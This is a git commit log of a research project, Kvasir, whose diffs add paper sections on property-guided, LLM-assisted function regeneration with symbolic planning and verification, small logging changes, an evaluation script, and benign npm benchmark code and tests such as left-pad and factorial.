+
+\heading{Verification and Feedback} The final phase verifies that the
+synthesized program satisfies the required properties. If verification
+fails---due to a violated constraint or behavioral divergnce---\sys uses this
+failure as a signal to refine the plan or resample the synthesis step. This
+forms a feedback loop: planning, synthesis, and verification interact until a
+satisfactory program is produced or the system exhausts its search.
+
+\sys is designed to support small-scale regeneration tasks,
+usually function-level rewrites.
+While some components generalize across languages, others---particularly
+property extraction and transformation strategies---must be adapted to the
+syntactic and semantic characteristics of the target language.
+
+\section{Property Language and Extraction}
+
+\sys represents program characteristics as symbolic \emph{properties}, drawn from a formal language of first-order predicates.
+These properties describe aspects of the input program and serve as regeneration constraints for the output.
+They form the basis of both planning and verification.
+
+\paragraph{Property Predicates.}
+Each property is represented as a logical predicate over the program symbol $p$. Common examples include:
+\begin{itemize}
+  \item \texttt{language}$(p, \texttt{javascript})$: the input program is written in JavaScript.
+  \item \texttt{signature}$(p)$: the program exposes a well-formed function signature.
+  \item \texttt{no\_network}$(p)$: the program performs no network operations.
+\end{itemize}
+
+Properties are classified into three categories:
+\begin{itemize}
+  \item $\mathsf{goal}(X)$: the user or system requires $X$ to hold in the regenerated program.
+  \item $\mathsf{can}(X)$: the system is capable of extracting or inferring $X$ from the input.
+  \item $\mathsf{do}(X)$: $X$ is selected for enforcement and will be preserved or regenerated.
+\end{itemize}
+
+\paragraph{Planning over Properties.}
+The logic engine determines the set of active properties to enforce by solving a constrained optimization problem over $\mathsf{do}(\cdot)$. It satisfies the following constraints:
+\begin{align*}
+  \mathsf{goal}(X) &\Rightarrow \mathsf{do}(X) &\text{Goals must be satisfied} \\
+  \mathsf{do}(X) &\Leftarrow \mathsf{can}(X) &\text{Apply only extractable properties}
+\end{align*}
+
+Additionally, the system maximizes the number of enforced properties: % TODO: Explain why
+\[
+\text{maximize} \quad |\{ X \mid \mathsf{do}(X) \}|
+\]
+
+\paragraph{Plugin-Defined Rules.}
+Plugins contribute domain-specific inference rules and constraints. For example, a plugin for JavaScript-to-Haskell translation may define:
+\begin{align*}
+\mathsf{can}(\texttt{translate}_{\texttt{js} \rightarrow \texttt{hs}}(p)) & \\
+\mathsf{do}(\texttt{translate}_{\texttt{js} \rightarrow \texttt{hs}}(p)) &\Rightarrow \mathsf{do}(\texttt{language}(p, \texttt{haskell})) \\
+\mathsf{do}(\texttt{translate}_{\texttt{js} \rightarrow \texttt{hs}}(p)) &\Rightarrow \mathsf{language}(p, \texttt{javascript})
+\end{align*}
+
+Another plugin might contribute $\mathsf{can}(\texttt{signature}(p))$, indicating that the function signature can be extracted.
+
+\paragraph{Axioms and Domain Knowledge.}
+The logic engine also supports domain-wide axioms. For example:
+\[
+\mathsf{do}(\texttt{language}(p, \texttt{haskell})) \Rightarrow \mathsf{do}(\texttt{pure}(p))
+\]
+This captures the assumption that programs written in Haskell are pure by default.
+Such axioms enrich the reasoning process and allow inferred properties to trigger downstream constraints or synthesis behaviors.
+
+\paragraph{Extensibility.}
+\sys’s property extraction is decentralized: plugins contribute $\mathsf{can}(\cdot)$ and reasoning rules, while the core planner resolves which properties to enforce based on goals, capabilities, and global constraints.
+This modularity allows language-specific analyses to coexist with general-purpose reasoning in a unified planning layer.
+
+By treating properties as planning primitives, \sys unifies static analysis, user intent, and regeneration constraints in a common symbolic framework.
+This design enables precise and interpretable control over the regeneration process.
+
+\section{Synthesis Plan}
+
+\sys performs regeneration through a structured synthesis plan that combines symbolic reasoning over program properties with targeted, language-model-guided code generation.
+The system is designed to support small-scale regeneration tasks—typically at the level of individual functions—where precision and control are critical.
+By focusing on localized rewrites rather than wholesale program replacement, \sys enables composable transformations that scale across large codebases when applied judiciously.
+
+\paragraph{From Properties to Plan.}
+The synthesis process begins with a set of enforced properties $\{ X \mid \mathsf{do}(X) \}$ selected by the planner (§\ref{sec:property-language}).
+These properties reflect both user goals (e.g., removing side effects, translating to a different language) and structural characteristics of the input program that should be preserved.
+The planner constructs a transformation plan that specifies, for each relevant unit of code (typically a function), what constraints must hold in the regenerated version.
+
+For instance, a plan for regenerating a specific function might include:
+\begin{itemize}
+  \item $\mathsf{do}(\texttt{language}(f, \texttt{haskell}))$ — the function must be rewritten in Haskell,
+  \item $\mathsf{do}(\texttt{pure}(f))$ — the function must be side-effect-free,
+  \item $\mathsf{do}(\texttt{signature}(f))$ — the original function signature must be preserved.
+\end{itemize}
+These constraints are scoped to the transformation unit and inform the synthesis phase directly.
+
+\paragraph{LLM-Guided Regeneration.}
+Each synthesis task is delegated to a language model guided by a structured prompt.
+The prompt is constructed by composing fragments contributed by active plugins, each of which has access to the current plan and can contribute natural language or code examples relevant to its domain.
+For example:
+\begin{itemize}
+  \item A signature plugin may contribute: \emph{“The output should implement a function \texttt{normalize(str: string): string}.”}
+  \item A purity plugin may add: \emph{“Avoid all side effects, including file system or network operations.”}
+  \item A language plugin may prepend: \emph{“Translate this JavaScript function into idiomatic Haskell.”}
+\end{itemize}
+
+These fragments are combined with a representation of the input function—possibly abstracted to suppress undesirable behavior—and submitted to the LLM as a constrained regeneration task.
+
+\paragraph{Locality and Compositionality.}
+The emphasis on function-level regeneration serves two purposes.
+First, it limits the scope of transformation, reducing the risk of unintended behavioral changes.
+Second, it enables \sys to reuse synthesized components across broader program contexts, composing regenerated units into a coherent whole.
+This design supports partial regeneration: some functions may be left unchanged, others regenerated under different plans.
+
+\paragraph{Constraint-Guided Generation.}
+While synthesis is delegated to an LLM, the planner constrains the generation space in two key ways:
+\begin{enumerate}
+  \item The prompt reflects only valid transformations under the current plan.
+  \item Candidate outputs are verified post hoc against the enforced properties (§\ref{sec:verification}), and failures result in rejection or plan revision.
+\end{enumerate}
+This hybrid model balances flexibility with rigor: the LLM provides diversity and fluency, while the planner ensures adherence to property-based constraints.
+
+\paragraph{Incremental and Adaptive Planning.}
+If a candidate program fails verification, \sys does not blindly retry.
+Instead, it may refine the plan: relaxing soft constraints, prioritizing alternatives, or invoking different plugin strategies.
+This incremental approach avoids overfitting to invalid candidates and supports fallback mechanisms when regeneration proves difficult.
+
+In sum, the synthesis plan acts as a structured contract between logical property reasoning and generative synthesis.
+By operating at a localized level and under clearly scoped constraints, \sys delivers regenerations that are both controlled and scalable—when applied thoughtfully and systematically.
+
+\section{Property Verification and Feedback Loop}
+\label{sec:verification}
+
+To validate that a regenerated program satisfies the intended goals, \sys includes an explicit verification phase that checks whether the output adheres to the enforced properties in the synthesis plan.
+Verification serves as a structural filter: it accepts only those candidates that meet the plan’s constraints and provides feedback for refining or retrying those that do not.
+
+\paragraph{Verification as Property Checking.}
+After synthesis, \sys invokes a set of property-specific checkers.
+Each checker is responsible for evaluating whether a property $X$ in $\mathsf{do}(X)$ holds for the regenerated program fragment.
+These checkers operate at varying levels of precision—ranging from structural pattern checks to light static or symbolic analysis—and are tailored to the property type.
+
+Examples include:
+\begin{itemize}
+  \item For $\mathsf{do}(\texttt{no\_network}(f))$, the checker confirms the absence of known network APIs or imports.
+  \item For $\mathsf{do}(\texttt{signature}(f))$, the checker matches the regenerated function’s name, parameters, and arity against the extracted signature.
+  \item For $\mathsf{do}(\texttt{pure}(f))$, the checker examines control flow and side-effecting operations to detect possible violations.
+\end{itemize}
+
+Checkers are modular and contributed by plugins. Their combined results determine whether a candidate is considered valid under the current plan.
+
+\paragraph{Failure-Driven Refinement.}
+When a candidate fails verification, \sys treats this as a feedback signal.
+Instead of discarding the regeneration attempt wholesale, the system uses the failure to revise or re-execute the synthesis phase.
+This may take several forms:
+\begin{itemize}
+  \item \emph{Retrying synthesis}: A fresh LLM call with the same plan but a different generation path.
+  \item \emph{Adjusting the plan}: Relaxing soft constraints or reordering plugin hooks to prioritize more tractable properties.
+  \item \emph{Fallback handling}: If a function repeatedly fails validation, \sys may leave the original version intact or mark it for manual inspection.
+\end{itemize}
+
+This loop provides adaptability: regeneration is not expected to succeed unconditionally, but rather to proceed incrementally under interpretable, bounded failure modes.
+
+\paragraph{Partial Regeneration and Composition.}
+\sys supports regeneration at the granularity of individual functions.
+If only a subset of functions can be successfully regenerated under the given constraints, the remaining ones are excluded from transformation.
+The output program thus consists of a composition of validated regenerated units and untouched originals.
+
+This model supports practical application in real-world codebases, where partial improvement (e.g., replacing unsafe or deprecated functions) can be meaningful even without complete coverage.
+
+\paragraph{Iterative, Property-Preserving Generation.}
+The synthesis-verification loop respects the symbolic contract defined in the planning phase.
+At each iteration, the system attempts to generate a program fragment that satisfies the active $\mathsf{do}(\cdot)$ properties.
+Failed attempts lead to refinement, not abandonment.
+New candidates are synthesized with awareness of prior failures, either by adapting the plan or sampling more selectively.
+
+The verifier interface is designed for extensibility: new properties can introduce new checkers without modifying the core regeneration pipeline.
+
+\paragraph{Behavioral Guarantees.}
+\sys does not aim to replicate the full semantics of the input program.
+Instead, it focuses on regenerating code that conforms to a declarative set of constraints.
+When a regenerated program passes verification, it is accepted as satisfying the subset of properties represented in the current plan.
+The system makes no claims beyond these verified constraints.
+
+This contract-driven model supports safe, localized rewrites in domains where correctness, compatibility, or safety properties must be preserved with high confidence, even in the presence of imperfect generative models.
+
+% TODO: Move this later maybe in implementation details
+% \section{Component Interface}
+
+% \sys adaptor, logic engine, and verifier components
+% are designed to be extensible.
+% These can be written in the form of plugins.
+% Adding a new to-be-preserved (or avoided) property involves 
+% creating a new adaptor function that extracts that property from the given 
+% program together with the logical pre-conditions that need to hold 
+% for it to be extractable, and a new verifier function that checks whether the
+% property is preserved in the regenerated program or \say{unknown}.
+% Each part of the plugin can produce logical atoms or rules which are fed to the \sys 
+% logical engine and can influence the regeneration process.
 
@@
   IOCCC                                                   & Obfuscated C code              & 2 & \cite{ioccc} \\
-Microbenchmarks                                         &          & 3    & This paper \\
+Microbenchmarks                                         &          & 3    & \\
   \hspace{.5em} \ttt{flatmap-stream}                      & Secure regeneration            &      & \cite{es1}  \\
@@
 constrained planning framework to guide transformations while remaining
-responsive to property-based requirements. This hybrid design aims to combine
-the expressiveness of LLMs with the controllability and robustness of symbolic
+responsive to property-based requirements.
+This design combines
+the scalability of LLM-assisted program sysnthesis with the controllability and robustness of symbolic
 reasoning. % TODO: focus on that \sys focuses on this specific problem domain
@@
 Kvasir aims to generalize this landscape by treating transformations as
-goal-directed regenerations—rather than prescriptive rewrites, driven by
+goal-directed regenerations---rather than prescriptive rewrites, driven by
 properties such as program behaviors and architectural goals, expressed declaratively.

### 2025-06-10 paper/draft.tex
Remove time overhead
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
 For instance, in the \texttt{flatmap-stream} benchmark, GPT-4 often preserved malicious side effects when the code appeared innocuous, whereas \sys generated provably pure rewrites by treating the source as untrusted and grounding regeneration in I/O behavior alone.
-
-\heading{Planning overhead}
-We measure the time taken by \sys's logic engine to select the minimal set of
-properties required to satisfy each query. 
-\begin{table}[h]
-  \centering
-  \caption{Planning overhead: time taken by \sys's logic engine to compute minimal property set.}
-  \begin{tabular}{lcc}
-    \toprule
-    Benchmark & Properties Considered & $T_{\text{plan}}$ (ms) \\
-    \midrule
-    Rosetta Code & \xxx & \xxx \\
-    npm Utilities & \xxx & \xxx \\
-    Python Utilities & \xxx & \xxx \\
-    SSCA & \xxx & \xxx \\
-    Microbenchmarks & \xxx & \xxx \\
-    \bottomrule
-  \end{tabular}
-\end{table}
-
 Across all benchmarks, the planning step completes in under \xxx ms on average.

### 2025-06-10 eval/query/to_haskell.pl
Add haskell query
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@ -1,0 +1,1 @@
+goal(language(p, haskell)).

### 2025-06-10 scripts/evaluate.sh
Add basic evaluation script
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@ -1,0 +1,12 @@
+#!/bin/bash
+
+set -euo pipefail
+
+top=$(git rev-parse --show-toplevel)
+
+input="$top/eval"
+output="$top/results"
+mkdir -p "$output"
+
+# Evaluate each task
+kvasir -vvv -i "$input"/math.js -q "$input"/query/to_haskell.pl -o "$output"/math.hs

### 2025-06-10 kvasir/logic.py
Use correct log statement
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@ -89,6 +89,6 @@ def plan(kb: KnowledgeBase, query: Query, program: Program):
     # Run the logic program given the query and program to produce a plan
     
     to_extract = run_engine(kb, query, program) 
-    print(f"Extracted properties: {to_extract}")
+    logger.info(f"List of properties in the plan: {to_extract}")
 
     return Plan(properties=to_extract)

### 2025-06-10 kvasir/program.py

@@ -60,7 +60,7 @@ class ProgramMeta(type):
     def __call__(cls, entry, *args, **kwargs):
         lang = detect_language(entry)
         subclass = cls.registry.get(lang, cls)
-        logger.info(
+        logger.debug(
             f"Detected language: {lang}, using subclass: {subclass.__name__}"
         )
         return super(ProgramMeta, subclass).__call__(entry, *args, **kwargs)

### 2025-06-10 kvasir/synth.py

@@ -33,7 +33,7 @@ class SynthesizeProgram(dspy.Module):
         logger.debug(f"Regenerated program source code: {regenerated_program_src}")
 
         with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix=program.language.suffix()) as file:
-            logger.info(f"Writing regenerated program to {file.name}")
+            logger.debug(f"Writing regenerated program to {file.name}")
             file.write(regenerated_program_src)
             file_path = file.name
         regenerated_program = Program(entry=file_path)
@@ -44,23 +44,23 @@ def regenerate(program, kb, query, plugins) -> Program:
     kb.add_logic(program.to_logic())
     for plugin in plugins:
         if hasattr(plugin, "knowledge"):
-            logger.info(f"Adding knowledge with {plugin.__name__}")
+            logger.debug(f"Adding knowledge with {plugin.__name__}")
             plugin.knowledge(kb, program)
 
     plan = logic.plan(kb, query, program)
     logger.info(f"Generated plan: {plan}")
 
     for plugin in plugins:
-        logger.info(f"Trying to apply {plugin.__name__} to the program {program}")
+        logger.debug(f"Trying to apply {plugin.__name__} to the program {program}")
         if hasattr(plugin, "apply") and plan.does(plugin.__name__):
-            logger.info(f"Applying {plugin.__name__}")
+            logger.debug(f"Applying {plugin.__name__}")
             plugin.apply(program)
 
     program_ = synthesize(program, plan)
 
     for plugin in plugins:
         if hasattr(plugin, "verify") and plan.does(plugin.__name__):
-            logger.info(f"Verifying {program_} against {program} with {plugin.__name__}")
+            logger.debug(f"Verifying {program_} against {program} with {plugin.__name__}")
             plugin.verify(program, program_)
 
     return program_
@@ -68,8 +68,6 @@ def regenerate(program, kb, query, plugins) -> Program:
 
 def synthesize(program, plan) -> Program:
     """Synthesize a new program based on the plan."""
-
-    logger.info(f"Synthesizing program with plan: {plan}")
     synthesize = SynthesizeProgram()
     regenerated_program = synthesize(program)
     if logger.level == logging.DEBUG:

### 2025-06-11 paper/draft.tex
Set name
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>
Add discussion and limitations section
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
 \usepackage{dirtytalk}
+\usepackage{textgreek}
 
@@
 \newcommand{\todo}[1]{\hl{\textbf{TODO:} #1}\xspace}
-\newcommand{\sys}{{\scshape Sys}\xspace}
+\newcommand{\sys}{{\scshape Kv{\textalpha}sir}\xspace}
 \newcommand{\rf}[1]{\ref{#1}}
@@
 
+\section{Discussion and Limitations}
+
+\sys is designed to support property-guided regeneration of program fragments, with a particular focus on function-level rewrites.
+Its strength lies in combining symbolic reasoning and generative synthesis in a modular and interpretable framework.
+However, this design comes with inherent tradeoffs, which we discuss below.
+
+\paragraph{Scope of Regeneration.}
+\sys is not intended for whole-program synthesis or full language migration.
+It operates most effectively when applied to localized program units—such as individual functions, methods, or modules—where the intended behavior is reasonably self-contained and describable via explicit properties.
+Applying \sys to larger-scale transformations may yield incomplete results, or expose coordination challenges not addressed by the current system.
+
+\paragraph{Dependence on Property Specification.}
+The system relies heavily on the quality and granularity of extracted or declared properties.
+In cases where desired behaviors cannot be easily expressed using available predicates, or where plugins fail to extract meaningful constraints, the regeneration plan may be under-constrained, leading to brittle or incorrect outputs.
+The framework is extensible, but each new property class requires new reasoning rules, extractors, and verifiers.
+
+\paragraph{Trust Model and Correctness.}
+\sys does not provide formal guarantees of semantic equivalence to the original program.
+Instead, correctness is defined relative to a set of enforced properties.
+This means that correctness is only as strong as the property definitions and associated checkers.
+In the presence of underspecified or unverifiable goals, regenerated code may exhibit unanticipated behavior—even if it passes all checks.
+
+\paragraph{LLM Limitations.}
+The generative synthesis phase is subject to the inherent variability and failure modes of large language models.
+These include hallucinations, sensitivity to prompt phrasing, and inconsistency under minor input changes.
+While \sys mitigates these risks through constraint-based planning and post-hoc verification, it cannot eliminate them entirely.
+In cases where no satisfactory candidate is found, regeneration may fail or require manual intervention.
+
+\paragraph{Language-Specific Support.}
+Although some components of \sys are language-agnostic (e.g., logic-based planning), others—particularly extraction and verification plugins—are not.
+Supporting a new language requires implementing language-specific analyzers and constraints.
+This modularity is deliberate, but it does limit out-of-the-box generality.
+
+\paragraph{Strategic Application.}
+In practice, \sys is best used as a surgical tool: to rewrite high-risk, deprecated, or poorly understood code under explicit constraints.
+Its effectiveness comes from focusing effort on narrow slices of functionality where correctness matters and regeneration goals are clear.
+Broad, untargeted application is unlikely to yield high-quality results.
+
+\paragraph{Future Directions.}
+Several extensions could improve \sys’s capabilities.
+These include richer property languages (e.g., temporal or dataflow properties), tighter integration with formal verification tools, learning-guided property extraction, and cross-component reasoning for coordinated rewrites.
+Additionally, integrating counterfactual generation techniques could help explain why certain regeneration goals are infeasible or conflicting.
+
+Overall, \sys offers a flexible framework for controlled regeneration, but its effectiveness depends on the specificity of goals, the availability of property logic, and the scope of the transformation task.
+Its design favors composability and clarity over full automation, aiming to serve as a building block in broader refactoring, auditing, or hardening pipelines.
+
+\section{Conclusion}
+
 \bibliographystyle{ACM-Reference-Format}

### 2025-06-11 eval/npm/append-string/index.js
Add npm and rosetta benchmarks
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@ -1,0 +1,38 @@
+'use strict';
+
+var os = require('os');
+
+/**
+ * Append a string to another string ensuring to preserve line ending characters.
+ *
+ * ```js
+ * console.log([appendString('abc\r\n', 'def')]);
+ * //=> [ 'abc\r\ndef\r\n' ]
+ *
+ * console.log([appendString('abc\n', 'def')]);
+ * //=> [ 'abc\ndef\n' ]
+ *
+ * // uses os.EOL when a line ending is not found
+ * console.log([appendString('abc', 'def')]);
+ * //=> [ 'abc\ndef' ]
+ * ```
+ * @param  {String} `str` String that will be used to check for an existing line ending. The suffix is appended to this.
+ * @param  {String} `suffix` String that will be appended to the str.
+ * @return {String} Final String
+ * @api public
+ */
+
+module.exports = function appendString(str, suffix) {
+  if (!suffix || !suffix.length) {
+    return str;
+  }
+  var eol;
+  if (str.slice(-2) === '\r\n') {
+    eol = '\r\n';
+  } else if (str.slice(-1) === '\n') {
+    eol = '\n';
+  } else {
+    return [str, os.EOL, suffix].join('');
+  }
+  return [str, suffix, eol].join('');
+};

### 2025-06-11 eval/npm/append-string/test.js

@@ -1,0 +1,44 @@
+'use strict';
+
+require('mocha');
+var os = require('os');
+var assert = require('assert');
+var appendString = require('./');
+
+describe('appendString', function() {
+  it('should append the string suffix to the string prefix with \\r\\n', function() {
+    assert.equal(appendString('abc\r\n', 'def'), 'abc\r\ndef\r\n');
+  });
+
+  it('should append the string suffix to the string prefix with \\n:', function() {
+    assert.equal(appendString('abc\n', 'def'), 'abc\ndef\n');
+  });
+
+  it('should append the string suffix to the string prefix without EOL', function() {
+    assert.equal(appendString('abc', 'def'), 'abc' + os.EOL + 'def');
+  });
+
+  it('should append the buffer suffix to the string prefix with \\r\\n', function() {
+    assert.equal(appendString('abc\r\n', new Buffer('def')), 'abc\r\ndef\r\n');
+  });
+
+  it('should append the buffer suffix to the string prefix with \\n:', function() {
+    assert.equal(appendString('abc\n', new Buffer('def')), 'abc\ndef\n');
+  });
+
+  it('should append the buffer suffix to the string prefix without EOL', function() {
+    assert.equal(appendString('abc', new Buffer('def')), 'abc' + os.EOL + 'def');
+  });
+
+  it('should not append EOL when suffix is empty', function() {
+    assert.deepEqual(appendString('abc', ''), 'abc');
+  });
+
+  it('should not append EOL when suffix is undefined', function() {
+    assert.deepEqual(appendString('abc'), 'abc');
+  });
+
+  it('should not append EOL when suffix is empty buffer', function() {
+    assert.deepEqual(appendString('abc', new Buffer('')), 'abc');
+  });
+});

### 2025-06-11 eval/npm/is-string/test/index.js

@@ -1,0 +1,39 @@
+'use strict';
+
+var test = require('tape-catch');
+var isString = require('../');
+var hasToStringTag = require('has-tostringtag/shams')();
+
+test('not Strings', function (t) {
+	t.notOk(isString(), 'undefined is not String');
+	t.notOk(isString(null), 'null is not String');
+	t.notOk(isString(false), 'false is not String');
+	t.notOk(isString(true), 'true is not String');
+	t.notOk(isString([]), 'array is not String');
+	t.notOk(isString({}), 'object is not String');
+	t.notOk(isString(function () {}), 'function is not String');
+	t.notOk(isString(/a/g), 'regex literal is not String');
+	t.notOk(isString(new RegExp('a', 'g')), 'regex object is not String');
+	t.notOk(isString(new Date()), 'new Date() is not String');
+	t.notOk(isString(42), 'number is not String');
+	t.notOk(isString(Object(42)), 'number object is not String');
+	t.notOk(isString(NaN), 'NaN is not String');
+	t.notOk(isString(Infinity), 'Infinity is not String');
+	t.end();
+});
+
+test('@@toStringTag', { skip: !hasToStringTag }, function (t) {
+	var fakeString = {
+		toString: function () { return '7'; },
+		valueOf: function () { return '42'; }
+	};
+	fakeString[Symbol.toStringTag] = 'String';
+	t.notOk(isString(fakeString), 'fake String with @@toStringTag "String" is not String');
+	t.end();
+});
+
+test('Strings', function (t) {
+	t.ok(isString('foo'), 'string primitive is String');
+	t.ok(isString(Object('foo')), 'string object is String');
+	t.end();
+});

### 2025-06-11 eval/npm/left-pad/dos.js

@@ -1,0 +1,53 @@
+'use strict';
+module.exports = leftPad;
+
+var cache = [
+  '',
+  ' ',
+  '  ',
+  '   ',
+  '    ',
+  '     ',
+  '      ',
+  '       ',
+  '        ',
+  '         '
+];
+
+function leftPad(str, len, ch=' ') {
+  // Ensure `str` is a string
+  if (typeof str !== 'string') {
+    str = String(str);
+  }
+
+  // Ensure `len` is a number and `ch` is a string
+  if (typeof len !== 'number' || isNaN(len)) {
+    throw new TypeError('Expected `len` to be a number');
+  }
+  if (typeof ch !== 'string') {
+    ch = String(ch);
+  }
+
+  // Calculate the number of padding characters needed
+  len = len - str.length;
+
+  // If no padding is needed, return the original string
+  if (len <= 0) return str;
+
+  // Use cached spaces for common use cases
+  if (ch === ' ' && len < 10) return cache[len] + str;
+
+  // Generate the padding string
+  var pad = '';
+  while (pad.length < len) {
+    pad += ch;
+  }
+
+  // If pad is longer than needed, slice it
+  if (pad.length > len) {
+    pad = pad.slice(0, len);
+  }
+
+  // Return the padded string
+  return pad + str;
+}

### 2025-06-11 eval/npm/left-pad/index.js

@@ -1,0 +1,47 @@
+'use strict';
+module.exports = leftPad;
+
+var cache = [
+  '',
+  ' ',
+  '  ',
+  '   ',
+  '    ',
+  '     ',
+  '      ',
+  '       ',
+  '        ',
+  '         '
+];
+
+function leftPad(str, len, ch) {
+  // convert `str` to a `string`
+  str = str + '';
+  // `len` is the `pad`'s length now
+  len = len - str.length;
+  // doesn't need to pad
+  if (len <= 0) return str;
+  // `ch` defaults to `' '`
+  if (!ch && ch !== 0) ch = ' ';
+  // convert `ch` to a `string` cuz it could be a number
+  ch = ch + '';
+  // cache common use cases
+  if (ch === ' ' && len < 10) return cache[len] + str;
+  // `pad` starts with an empty string
+  var pad = '';
+  // loop
+  while (true) {
+    // add `ch` to `pad` if `len` is odd
+    if (len & 1) pad += ch;
+    // divide `len` by 2, ditch the remainder
+    len >>= 1;
+    // "double" the `ch` so this operation count grows logarithmically on `len`
+    // each time `ch` is "doubled", the `len` would need to be "doubled" too
+    // similar to finding a value in binary search tree, hence O(log(n))
+    if (len) ch += ch;
+    // `len` is 0, exit the loop
+    else break;
+  }
+  // pad `str`!
+  return pad + str;
+}

### 2025-06-11 eval/npm/left-pad/test.js

@@ -1,0 +1,83 @@
+var leftPad = require("./");
+var test = require("tape-catch");
+var fc = require("fast-check");
+
+test('edge cases', function (assert) {
+    assert.plan(12);
+    assert.strictEqual(leftPad('foobar', 6), 'foobar');
+    assert.strictEqual(leftPad('foobar', 5), 'foobar');
+    assert.strictEqual(leftPad('foobar', -1), 'foobar');
+    assert.strictEqual(leftPad('foobar', 6, '1'), 'foobar');
+    assert.strictEqual(leftPad('foobar', 5, '1'), 'foobar');
+    assert.strictEqual(leftPad('foobar', -1, '1'), 'foobar');
+    assert.strictEqual(leftPad('foobar', 8, ''), '  foobar');
+    assert.strictEqual(leftPad('foobar', 8, false), '  foobar', 'false default to space');
+    assert.strictEqual(leftPad('foobar', 8, 0), '00foobar', '0 is treated as 0');
+    assert.strictEqual(leftPad(0, 3, 1), '110', 'integer for str is converted to string');
+    assert.strictEqual(leftPad(true, 7), '   true', 'boolean for str is converted to string');
+    assert.strictEqual(leftPad('', 2), '  ', 'empty str for str');
+});
+
+test('spaces for ch', function (assert) {
+    assert.plan(12);
+    // default to space if not specified
+    assert.strictEqual(leftPad('foo', 2), 'foo');
+    assert.strictEqual(leftPad('foo', 3), 'foo');
+    assert.strictEqual(leftPad('foo', 4), ' foo');
+    assert.strictEqual(leftPad('foo', 5), '  foo');
+    assert.strictEqual(leftPad('foo', 12), '         foo');
+    assert.strictEqual(leftPad('foo', 13), '          foo');
+    // explicit space param
+    assert.strictEqual(leftPad('foo', 2, ' '), 'foo');
+    assert.strictEqual(leftPad('foo', 3, ' '), 'foo');
+    assert.strictEqual(leftPad('foo', 4, ' '), ' foo');
+    assert.strictEqual(leftPad('foo', 5, ' '), '  foo');
+    assert.strictEqual(leftPad('foo', 12, ' '), '         foo');
+    assert.strictEqual(leftPad('foo', 13, ' '), '          foo');
+});
+
+test('non spaces for ch', function (assert) {
+    assert.plan(7);
[…]

### 2025-06-11 eval/npm/lowercase-keys/test.js

@@ -1,0 +1,9 @@
+import test from 'ava';
+import { createRequire } from 'module';
+const require = createRequire(import.meta.url);  // Dynamically create 'require'
+const lowercaseKeys = require('./');
+
+test('main', t => {
+	t.true(lowercaseKeys({FOO: true}).foo);
+	t.true(lowercaseKeys({FOO: true, bAr: true}).bar);
+});

### 2025-06-11 eval/npm/math-factorial/index.js

@@ -1,0 +1,36 @@
+/**
+ * A [Factorial](https://en.wikipedia.org/wiki/Factorial), usually written n!, is the product of all positive
+ * integers less than or equal to n. Often factorial is implemented
+ * recursively, but this iterative approach is significantly faster
+ * and simpler.
+ *
+ * @param {number} n input, must be an integer number 1 or greater
+ * @returns {number} factorial: n!
+ * @throws {Error} if n is less than 0 or not an integer
+ * @example
+ * factorial(5); // => 120
+ */
+function factorial(n) {
+    // factorial is mathematically undefined for negative numbers
+    if (n < 0) {
+        throw new Error("factorial requires a non-negative value");
+    }
+
+    if (Math.floor(n) !== n) {
+        throw new Error("factorial requires an integer input");
+    }
+
+    // typically you'll expand the factorial function going down, like
+    // 5! = 5 * 4 * 3 * 2 * 1. This is going in the opposite direction,
+    // counting from 2 up to the number in question, and since anything
+    // multiplied by 1 is itself, the loop only needs to start at 2.
+    let accumulator = 1;
+    for (let i = 2; i <= n; i++) {
+        // for each number up to and including the number `n`, multiply
+        // the accumulator my that number.
+        accumulator *= i;
+    }
+    return accumulator;
+}
+
+module.exports = factorial;

### 2025-06-11 eval/npm/math-factorial/test.js

@@ -1,0 +1,36 @@
+/* eslint no-shadow: 0 */
+
+const test = require("tape-catch");
+const ss = require("../dist/simple-statistics.js");
+const factorial = require("./");
+
+test("factorial", function (t) {
+    t.test(
+        "cannot calculate the factorial of a number lower than zero",
+        function (t) {
+            t.throws(function () {
+                factorial(-1);
+            });
+            t.end();
+        }
+    );
+    t.test("rejects floating-point inputs", function (t) {
+        t.throws(function () {
+            factorial(0.5);
+        });
+        t.end();
+    });
+    t.test("can calculate 0! = 1", function (t) {
+        t.equal(factorial(0), 1);
+        t.end();
+    });
+    t.test("can calculate 1! = 1", function (t) {
+        t.equal(factorial(1), 1);
+        t.end();
+    });
+    t.test("can calculate 100! = 1", function (t) {
+        t.equal(factorial(100), 9.33262154439441e157);
+        t.end();
+    });
+    t.end();
+});

### 2025-06-11 eval/npm/string-repeating/test.js

@@ -1,0 +1,25 @@
+import test from 'ava';
+import { createRequire } from 'module';
+const require = createRequire(import.meta.url);  // Dynamically create 'require'
+const repeating = require('./');
+
+test('error', t => {
+	t.throws(() => {
+		repeating(5, 5);
+	}, {
+		message: 'Expected `input` to be a `string`, got `number`'
+	});
+
+	t.throws(() => {
+		repeating(-5, 'foo');
+	}, {
+		message: 'Expected `count` to be a positive finite number, got `-5`'
+	});
+});
+
+test('repeating', t => {
+	t.is(repeating(5), '     ');
+	t.is(repeating(5, ''), '');
+	t.is(repeating(5, 'a'), 'aaaaa');
+	t.is(repeating(3, 'unicorn'), 'unicornunicornunicorn');
+});

### 2025-06-11 eval/micro/math.hs
Add microbenchmarks
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@ -1,0 +1,2 @@
+add :: Num a => a -> a -> a
+add a b = a + b

### 2025-06-11 eval/flatmap.hs
Organize
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@ -1,20 +1,0 @@
--- Main.hs
-module Main where
-
--- Define nested list
-data NestedList a
-  = Elem a
-  | List [NestedList a]
-  deriving (Show, Eq)
-
--- | flatmap: flatten any depth of nesting and apply f to every element
-flatmap :: (a -> b) -> NestedList a -> [b]
-flatmap f (Elem x) = [f x]
-flatmap f (List x) = concatMap (flatmap f) x
-
-main :: IO ()
-main = do
-    let result1 = flatmap (+1) (Elem 5)
-    let result2 = flatmap (+1) (List [Elem 1, List [Elem 2, Elem 3], Elem 4])
-    print result1  -- Output: [6]
-    print result2  -- Output: [2,3,4]

### 2025-06-11 eval/math.hs

@@ -1,2 +1,0 @@
-add :: Num a => a -> a -> a
-add a b = a + b

